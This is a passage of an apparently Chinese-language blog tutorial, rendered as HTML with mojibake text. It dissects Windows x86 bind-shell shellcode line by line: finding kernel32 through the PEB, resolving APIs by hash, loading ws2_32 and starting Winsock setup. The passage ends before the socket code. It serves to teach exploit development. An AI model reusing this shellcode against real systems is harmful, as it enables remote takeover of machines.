<h4 id="è®¾ç½®å‡½æ•°åœ°å€å­˜æ”¾ç©ºé—´"><a href="#è®¾ç½®å‡½æ•°åœ°å€å­˜æ”¾ç©ºé—´" class="headerlink" title="è®¾ç½®å‡½æ•°åœ°å€å­˜æ”¾ç©ºé—´"></a>è®¾ç½®å‡½æ•°åœ°å€å­˜æ”¾ç©ºé—´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; start of proper code </span><br><span class="line">	cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) </span><br><span class="line">	xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">	lea edi, [esi - 0x18] 	; edi = addr to start writing function </span><br><span class="line">							; addresses (last addr will be written just </span><br><span class="line">							; before &quot;cmd&quot;) </span><br></pre></td></tr></table></figure>

<p>cdqæŒ‡ä»¤çš„ä½œç”¨æ˜¯eaxå¸¦ç¬¦å·æ‹“å±•åˆ°edx:eax,åˆbindshellä¸€å¼€å§‹æ—¶,eaxå¯„å­˜å™¨ä¸­æ˜¯ä¸€ä¸ªç”¨æˆ·æ ˆåœ°å€,æ˜¾ç„¶è¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªå°äº0x80000000çš„æ•°,é‚£ä¹ˆeaxçš„æœ€é«˜ä½å¿…ç„¶æ˜¯0,å¸¦ç¬¦å·æ‹“å±•åˆ°edxå…¨æ˜¯0,è¿™å°±ç”¨æœ€çŸ­çš„æŒ‡ä»¤ä½¿å¾—edxç½®é›¶äº†</p>
<p>xchgå°†eaxå’Œesiå¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œäº¤æ¢,äº¤æ¢å‰esi&#x3D;0,eax&#x3D;address(shellcode)</p>
<p>äº¤æ¢åeax&#x3D;0,esi&#x3D;address(shellcode),åˆshellcodeæœ€å¼€å§‹å°±æ˜¯<code>_emit 0x59	; LoadLibraryA ; pop ecx </code>å³LoadLibraryAå‡½æ•°çš„æ‘˜è¦å€¼,å› æ­¤ç›¸å½“äºè®¾ç½®å¥½äº†æºæ“ä½œæ•°</p>
<p>ç„¶åesi-0x18è¿™ä¸ªåœ°å€æ”¾åˆ°ediä¸Š,è·ç¦»esiå…±24å­—èŠ‚,æ”¾åˆ°æ‰§è¡Œæ–¹å‘çš„åæ–¹å‘,æ„æ€æ˜¯ä¸è¦å¹²æ‰°shellcodeçš„æ‰§è¡Œ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png"></p>
<p><strong>å¥‡æ€ªçš„æ˜¯,æˆ‘ä»¬éœ€è¦è§£æ8ä¸ªç¬¦å·,ä¸ºä»€ä¹ˆåªç»™äº†24å­—èŠ‚6ä¸ªç¬¦å·çš„åœ°å€ç©ºé—´å‘¢?</strong></p>
<p><strong>è¿™æ˜¯å› ä¸ºåä¸¤ä¸ªç¬¦å·å°†ä¼šè¦†ç›–ä¸€å¼€å§‹ç»™ä»–è®¾å®šçš„æ‘˜è¦çš„ä½ç½®</strong></p>
<h4 id="è·å–kernel32-dllåŸºåœ°å€"><a href="#è·å–kernel32-dllåŸºåœ°å€" class="headerlink" title="è·å–kernel32.dllåŸºåœ°å€"></a>è·å–kernel32.dllåŸºåœ°å€</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>

<p>ç„¶åå¼€å§‹å®šä½kernel32.dllçš„åŸºåœ°å€</p>
<img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="md,ç»äº†" style="zoom: 33%;" />

<p>fsæ®µé€‰æ‹©å­æŒ‡å‘GDTä¸­å½“å‰ç¨‹åºçš„çº¿ç¨‹ç¯å¢ƒå—æè¿°ç¬¦,</p>
<p>ç”¨fsæ®µè¶…è¶Šå¯»å€,fs:[edx+0x30],æ­¤æ—¶edx&#x3D;0,å®é™…ä¸Šç›¸å½“äºfs:[0x30],ä¹Ÿå°±æ˜¯TEBè¡¨çš„0x30ä½ç½®,å³PEBçš„æŒ‡é’ˆ.</p>
<table>
<thead>
<tr>
<th>å¯„å­˜å™¨</th>
<th>å€¼æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>ebx</td>
<td>PEBåŸºåœ°å€</td>
</tr>
<tr>
<td>ecx</td>
<td>initialisation orderè¡¨ç¬¬äºŒé¡¹,kernel32.dllç›¸å…³é¡¹</td>
</tr>
<tr>
<td>ebp</td>
<td>kernel32.dllçš„åŸºåœ°å€</td>
</tr>
</tbody></table>
<h4 id="æŠ¬æ ˆç”³è¯·ç©ºé—´"><a href="#æŠ¬æ ˆç”³è¯·ç©ºé—´" class="headerlink" title="æŠ¬æ ˆç”³è¯·ç©ºé—´"></a>æŠ¬æ ˆç”³è¯·ç©ºé—´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; make some stack space </span><br><span class="line">	mov dh, 0x03 			; sizeof(WSADATA) is 0x190 </span><br><span class="line">	sub esp, edx </span><br></pre></td></tr></table></figure>

<p>edxå§‹ç»ˆæ˜¯0,dh&#x3D;0x03åˆ™edx&#x3D;0x300</p>
<p>ç„¶åæŠ¬æ ˆ0x300å­—èŠ‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" alt="image-20220918174706970"></p>
<p>å…ˆå‰esp&#x3D;0x12FF38,ä¹‹åesp&#x3D;0x12FC38</p>
<h4 id="â€œws2-32â€å­—ç¬¦ä¸²å‹æ ˆ"><a href="#â€œws2-32â€å­—ç¬¦ä¸²å‹æ ˆ" class="headerlink" title="â€œws2_32â€å­—ç¬¦ä¸²å‹æ ˆ"></a>â€œws2_32â€å­—ç¬¦ä¸²å‹æ ˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; push a pointer to &quot;ws2_32&quot; onto stack </span><br><span class="line">	mov dx, 0x3233 			; rest of edx is null </span><br><span class="line">	push edx </span><br><span class="line">	push 0x5f327377 </span><br><span class="line">	push esp </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸‰ä¸ªå‹æ ˆ,å‰ä¸¤ä¸ªæ˜¯å‹å…¥â€ws2_32â€,åé¢è¿™ä¸ªæ˜¯ä¿å­˜å½“æ—¶çš„espä½ç½®</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png" alt="image-20220918170246010"></p>
<h3 id="å¤–åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹"><a href="#å¤–åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹" class="headerlink" title="å¤–åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹"></a>å¤–åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>

<p>æ±‡ç¼–è¯­è¨€ä¸­ä¸ä¼šå¹³ç™½æ— æ•…åœ°è®¾ç½®æ ‡å·çš„,éƒ½æ˜¯ä¸ºäº†æ–¹ä¾¿è·³è½¬,è¿™é‡Œâ€find_lib_functionsâ€æ ‡å·æ„å‘³ç€å¾ªç¯å¼€å§‹äº†</p>
<p>lodsbç›¸å½“äº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png" alt="image-20220918174632185"></p>
<p>ç„¶åalå’Œ0xd3æ¯”è¾ƒçš„æ„æ€æ˜¯,æ˜¯å¦æ˜¯è¦è§£æWSAStartupè¿™ä¸ªå‡½æ•°,å¦‚æœæ˜¯,åˆ™è¯´æ˜è¦åˆ°ws2_32åº“ä¸­è§£æå‡½æ•°äº†,è€Œåˆšæ‰ä¸€ç›´éƒ½æ˜¯åœ¨kernel32.dllä¸­è§£æå‡½æ•°,å› æ­¤æ­¤æ—¶éœ€è¦æ›´æ¢åº“åŸºå€,åˆå·²ç»ä»kernel32.dllè§£æäº†LoadLibraryA,å› æ­¤å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥windowsAPIå¯»æ‰¾ws2_32.dllçš„åŸºåœ°å€</p>
<p>å¦‚æœal&#x3D;0xd3å°±é¡ºåºæ‰§è¡Œ,ä¸è·³è½¬,è°ƒç”¨LoadLibraryAæ›´æ¢åº“å‡½æ•°åœ°å€,ç„¶åå†æ‰§è¡Œfind_functions,å¦åˆ™ç›´æ¥è·³è½¬find_functions</p>
<h3 id="ä¸­åœˆå¾ªç¯åˆå§‹åŒ–"><a href="#ä¸­åœˆå¾ªç¯åˆå§‹åŒ–" class="headerlink" title="ä¸­åœˆå¾ªç¯åˆå§‹åŒ–"></a>ä¸­åœˆå¾ªç¯åˆå§‹åŒ–</h3><p>å®é™…ä¸Šå¤–åœˆå¾ªç¯ä¸€æ¬¡,ä¸­åœˆå°±åˆå§‹åŒ–ä¸€æ¬¡,ä¸¤ä¸ªå¯ä»¥çœ‹æˆä¸€å—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå°†æ‰€æœ‰å¯„å­˜å™¨å‹æ ˆ,å³ä½¿æœ‰çš„å¯„å­˜å™¨ä¸éœ€è¦å‹æ ˆä¿å­˜,ä¹Ÿè¦ä½¿ç”¨è¿™æ¡æŒ‡ä»¤,å› ä¸ºå®ƒçŸ­</p>
<p>å‡è®¾å½“å‰ä»ç„¶æ˜¯åœ¨kernel32.dllä¸­è§£æå‡½æ•°,è¿™æ„å‘³ç€find_lib_functionsä¸­çš„push ediä¸ä¼šæ‰§è¡Œ,é‚£ä¹ˆæ­¤æ—¶çš„å †æ ˆçŠ¶æ€æ˜¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png" alt="image-20220918172313484"></p>
<p>ebpæŒ‡å‘çš„æ˜¯kernel32.dllæˆ–è€…ws2_32.dllçš„åŸºåœ°å€,åº“åŸºåœ°å€åç§»0x3cçš„åœ°æ–¹æ˜¯åº“çš„PEå¤´,</p>
<p>PEå¤´åç§»0x78çš„åœ°æ–¹æ˜¯å¯¼å‡ºå‡½æ•°åœ°å€(RVA)è¡¨çš„æŒ‡é’ˆ,è¿™ä¸ªåœ°å€äº¤ç»™ecxä¿ç®¡</p>
<p>ecxåŠ ä¸Šebpçš„ä½œç”¨æ˜¯è·å¾—å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„ç»å¯¹è™šæ‹Ÿåœ°å€(åˆšæ‰ecxä¸­æ˜¯ç›¸å¯¹äºåº“åŸºå€çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€)</p>
<p>ecx+0x20å¤„æ˜¯å¯¼å‡ºå‡½æ•°åè¡¨çš„æŒ‡é’ˆ,è§£å¼•ç”¨åå°†å¯¼å‡ºå‡½æ•°åè¡¨çš„ç›¸å¯¹åŸºåœ°å€äº¤ç»™ebxä¿ç®¡</p>
<p>ebxå†åŠ ä¸Šebpå°±å¾—åˆ°äº†å¯¼å‡ºå‡½æ•°åè¡¨çš„ç»å¯¹è™šæ‹Ÿåœ°å€</p>
<p>ediç½®é›¶,å°†ä¼šä½œä¸ºä¸­åœˆå¾ªç¯å˜é‡</p>
<table>
<thead>
<tr>
<th>å¯„å­˜å™¨</th>
<th>å€¼æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>eax</td>
<td>RVA(PEå¤´)</td>
</tr>
<tr>
<td>ebx</td>
<td>VA(å¯¼å‡ºå‡½æ•°åè¡¨)</td>
</tr>
<tr>
<td>ecx</td>
<td>VA(å¯¼å‡ºå‡½æ•°åœ°å€è¡¨)</td>
</tr>
<tr>
<td>edi</td>
<td>ä¸­åœˆå¾ªç¯å˜é‡,ä½œä¸ºå¯¼å‡ºå‡½æ•°è¡¨çš„ä¸‹æ ‡</td>
</tr>
</tbody></table>
<h3 id="ä¸­åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹"><a href="#ä¸­åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹" class="headerlink" title="ä¸­åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹"></a>ä¸­åœˆå¾ªç¯ä¸€æ¬¡å¼€å§‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>

<p>ediæ¯æ¬¡è‡ªå¢1,ç„¶å[ebx+edi*4]åŸºå€å˜å€å¯»å€,ebxæ˜¯å¯¼å‡ºå‡½æ•°åè¡¨çš„åŸºåœ°å€,<code>ebx+edi*4</code>å°±ç›¸å½“äºä¸‹æ ‡è®¿é—®æ•°ç»„name[edi],</p>
<p>è¿™ä¸ªå¯¼å‡ºå‡½æ•°åè¡¨çš„æ¯ä¸€é¡¹éƒ½æ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆ,è§£å¼•ç”¨åå–å¾—ä¸€ä¸ªå‡½æ•°åå­—ç¬¦ä¸²çš„ç›¸å¯¹åŸºåœ°å€,æ”¾åˆ°esi,ç„¶åesi+ebpå¾—åˆ°è¯¥å‡½æ•°åå­—ç¬¦ä¸²çš„ç»å¯¹åŸºåœ°å€.</p>
<p>cdqç”¨eaxå¸¦ç¬¦å·æ‹“å±•å°†edxç½®é›¶,å› ä¸ºedxé©¬ä¸Šå°±è¦å­˜æ”¾è¯¥å¯¼å‡ºå‡½æ•°åçš„å“ˆå¸Œå€¼äº†</p>
<h3 id="å†…åœˆå¾ªç¯hash-loop"><a href="#å†…åœˆå¾ªç¯hash-loop" class="headerlink" title="å†…åœˆå¾ªç¯hash_loop"></a>å†…åœˆå¾ªç¯hash_loop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>

<p>å†…åœˆå¾ªç¯å°±æ˜¯è®¡ç®—esiå¼€å§‹çš„å¯¼å‡ºå‡½æ•°åçš„å“ˆå¸Œå€¼</p>
<p>lodsbç›¸å½“äº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡å–è¯¥å‡½æ•°åçš„ä¸€ä¸ªå­—èŠ‚æ”¾åˆ°alä¸Š,å’Œ0x71æŒ‰ä½å¼‚æˆ–ä¹‹åç”¨dlå‡å»è¯¥å¼‚æˆ–å€¼,dlè´Ÿè´£ç´¯è®¡å“ˆå¸Œå€¼</p>
<p>å¦‚æœalä¸0x71å¼‚æˆ–å¾—åˆ°0x71è¯´æ˜alæœ¬æ¥å°±æ˜¯00,è¯´æ˜è¯¥å­—ç¬¦ä¸²éå†åˆ°å¤´â€™\0â€™äº†,æ­¤æ—¶ç®—æ˜¯è®¡ç®—å®Œäº†æœ¬å‡½æ•°åçš„å“ˆå¸Œå€¼</p>
<h3 id="ä¸­åœˆå¾ªç¯ä¸€æ¬¡åˆ¤æ–­"><a href="#ä¸­åœˆå¾ªç¯ä¸€æ¬¡åˆ¤æ–­" class="headerlink" title="ä¸­åœˆå¾ªç¯ä¸€æ¬¡åˆ¤æ–­"></a>ä¸­åœˆå¾ªç¯ä¸€æ¬¡åˆ¤æ–­</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">jnz next_function_loop </span><br></pre></td></tr></table></figure>

<p>alä¸­å­˜æ”¾åˆšè®¡ç®—å‡ºå“ˆå¸Œå€¼,esp+0x1cæŒ‡å‘çš„æ˜¯æˆ‘ä»¬æ­£åœ¨ç»™ä»–è§£æåœ°å€çš„å‡½æ•°æ‘˜è¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" alt="image-20220918171355607"></p>
<p>alä¸[esp+0x1c]ä¸€æ¯”åˆ’,å¦‚æœç›¸ç­‰è¯´æ˜è¯¥æ‰¾åˆ°äº†ç›®æ ‡å‡½æ•°,è·³å‡ºä¸­åœˆå¾ªç¯</p>
<p>å¦‚æœä¸ç›¸ç­‰è¯´æ˜å½“å‰åº“å‡½æ•°åä¸æ˜¯æˆ‘ä»¬æƒ³è¦è§£æçš„,éœ€è¦ä¸­åœˆéå†ä¸‹ä¸€ä¸ªå‡½æ•°å,å› æ­¤<code>jnz next_function_loop </code></p>
<h3 id="å¤–åœˆå¾ªç¯ä¸€æ¬¡ç»“æŸ-å›å†™ç›®æ ‡å‡½æ•°ç»å¯¹åœ°å€"><a href="#å¤–åœˆå¾ªç¯ä¸€æ¬¡ç»“æŸ-å›å†™ç›®æ ‡å‡½æ•°ç»å¯¹åœ°å€" class="headerlink" title="å¤–åœˆå¾ªç¯ä¸€æ¬¡ç»“æŸ,å›å†™ç›®æ ‡å‡½æ•°ç»å¯¹åœ°å€"></a>å¤–åœˆå¾ªç¯ä¸€æ¬¡ç»“æŸ,å›å†™ç›®æ ‡å‡½æ•°ç»å¯¹åœ°å€</h3><p>æ­¤æ—¶å¯„å­˜å™¨ä¸­å€¼çš„æ„ä¹‰æ¥è‡ª ä¸­åœˆå¾ªç¯åˆå§‹åŒ–</p>
<table>
<thead>
<tr>
<th>ebx</th>
<th>VA(å¯¼å‡ºå‡½æ•°åè¡¨)</th>
</tr>
</thead>
<tbody><tr>
<td>ecx</td>
<td>VA(å¯¼å‡ºå‡½æ•°åœ°å€è¡¨)</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 		; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 					; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br></pre></td></tr></table></figure>

<p>ecx+0x24æŒ‡å‘åºå·è¡¨çš„RVA,è§£å¼•ç”¨åå°†åºå·è¡¨RVAæ”¾åˆ°ebxä¸Šç„¶ååŠ ä¸Šebpä¸­çš„åº“åŸºå€å°±å¾—åˆ°äº†VA(åºå·è¡¨)</p>
<p>ç”¨å‡½æ•°åè¡¨çš„ä¸‹æ ‡æŸ¥åºå·è¡¨,å¾—åˆ°çš„å€¼ä½œä¸ºä¸‹æ ‡æŸ¥åœ°å€è¡¨å°±å¾—åˆ°äº†å‡½æ•°åœ°å€,</p>
<p>åœ¨å›å†™ä¹‹å‰é¦–å…ˆé€€æ ˆè¿˜åŸedi,è¿™æ˜¯å› ä¸ºåœ¨ä¸­åœˆå¾ªç¯åˆå§‹åŒ–æ—¶æ‰€æœ‰å¯„å­˜å™¨éƒ½å‹æ ˆä¿å­˜äº†,åæ¥æ— æ³•ä¿è¯ediæ˜¯å¦è¢«ä¿®æ”¹è¿‡,å› æ­¤è¿™é‡Œé‡‡ç”¨å †æ ˆä¸Šä¿å­˜çš„å€¼è¿˜åŸedi,ç”±äºediæ˜¯æœ€åä¸€ä¸ªå…¥æ ˆçš„å¯„å­˜å™¨,æ­¤æ—¶ä½äºæ ˆé¡¶,ç›´æ¥popå°±å¯ä»¥è¿˜åŸäº†,åœ¨å›¾ä¸Šçœ‹å°±æ˜¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" alt="image-20220918171355607"></p>
<p>ç„¶åä½¿ç”¨stosd,ç›¸å½“äº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [edi],eax</span><br><span class="line">add edi,4</span><br></pre></td></tr></table></figure>

<p>è¿™å°±å°†å‡½æ•°åœ°å€å›å†™åˆ°äº†é¢„ç•™çš„å‡½æ•°åœ°å€ç©ºé—´ä¸­äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png" alt="image-20220918174549264"></p>
<p>ç„¶åå†å°†ediå‹æ ˆæ˜¯ä¸ºäº†å‡‘é½popadçš„ç»“æ„,ç»™ediå ä½é˜²æ­¢é”™ä½å¼¹å‡º</p>
<p>æœ€åpopadå°†æ‰€æœ‰å‹æ ˆä¿å­˜çš„å¯„å­˜å™¨è¿˜åŸ,æ­¤æ—¶çš„å †æ ˆçŠ¶æ€ä¸º</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png" alt="image-20220918173600627"></p>
<p>æ‰€æœ‰å¯„å­˜å™¨çš„æ„ä¹‰ä¸º</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png" alt="image-20220918173623051"></p>
<h3 id="å¤–åœˆå¾ªç¯åˆ¤æ–­æ˜¯å¦å…¨éƒ¨è§£æå®Œæ¯•"><a href="#å¤–åœˆå¾ªç¯åˆ¤æ–­æ˜¯å¦å…¨éƒ¨è§£æå®Œæ¯•" class="headerlink" title="å¤–åœˆå¾ªç¯åˆ¤æ–­æ˜¯å¦å…¨éƒ¨è§£æå®Œæ¯•"></a>å¤–åœˆå¾ªç¯åˆ¤æ–­æ˜¯å¦å…¨éƒ¨è§£æå®Œæ¯•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp esi, edi 				; loop until we reach end of last hash </span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹ç»™8ä¸ªç¬¦å·çš„åœ°å€åªé¢„ç•™äº†24å­—èŠ‚çš„ç©ºé—´,èƒ½å¤Ÿå®¹çº³6ä¸ªç¬¦å·,å‰©ä¸‹ä¸¤ä¸ªç¬¦å·éœ€è¦è¦†ç›–æ‘˜è¦å€¼</p>
<p>å½“ediè¿½ä¸Šesiçš„æ—¶å€™æ„å‘³ç€è¦†ç›–å®Œæˆ,8ä¸ªç¬¦å·å·²ç»éƒ½è§£æäº†,æ­¤æ—¶å¤–åœˆå¾ªç¯ä¹Ÿç»“æŸäº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png" alt="image-20220918174325158"></p>
<h2 id="å»ºç«‹Socketé€šä¿¡"><a href="#å»ºç«‹Socketé€šä¿¡" class="headerlink" title="å»ºç«‹Socketé€šä¿¡"></a>å»ºç«‹Socketé€šä¿¡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop esi 					; saved location of first winsock function </span><br><span class="line">							; we will lodsd and call each func in sequence </span><br></pre></td></tr></table></figure>

<blockquote>
<p>åœ¨å¤–åœˆå¾ªç¯ä¸€æ¬¡çš„æ—¶å€™æ›¾ç»åŒºåˆ«å¤„ç†è¿‡ws2_32.dllçš„å‡½æ•°æœ‰ä¸€ä¸ªpush ediå‹æ ˆ,æ„æ€æ˜¯å‹æ ˆä¿å­˜ç¬¬ä¸€æ¡ws2_32.dllå‡½æ•°çš„åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>


</blockquote>
<p>åœ¨æ‰§è¡Œæœ¬æ¡æŒ‡ä»¤<strong>ä¹‹å‰</strong>çš„å †æ ˆçŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png" alt="image-20220918175317614"></p>
<p>pop esiä¹‹å,esiå°±æŒ‡å‘äº†ç¬¬ä¸€æ¡ws2_32çš„å‡½æ•°åœ¨é¢„ç•™ç©ºé—´ä¸­çš„åœ°å€,ä¹Ÿå°±æ˜¯WSAStartupçš„é¢„ç•™åœ°å€</p>
<h3 id="è°ƒç”¨WSAStartUp"><a href="#è°ƒç”¨WSAStartUp" class="headerlink" title="è°ƒç”¨WSAStartUp"></a>è°ƒç”¨WSAStartUp</h3><blockquote>
<p>è¯¥APIå‡½æ•°ä½œç”¨æ˜¯ä¸ºè¿›ç¨‹ä½¿ç”¨Winsockæ¨¡å—åˆå§‹åŒ–,å¿…é¡»å…ˆè°ƒç”¨è¯¥å‡½æ•°æ‰å¯ä»¥æ¿€æ´»Winsockæ¨¡å—ä¸­çš„å…¶ä»–å‡½æ•°,å…¶æ¥å£ä¸º</p>
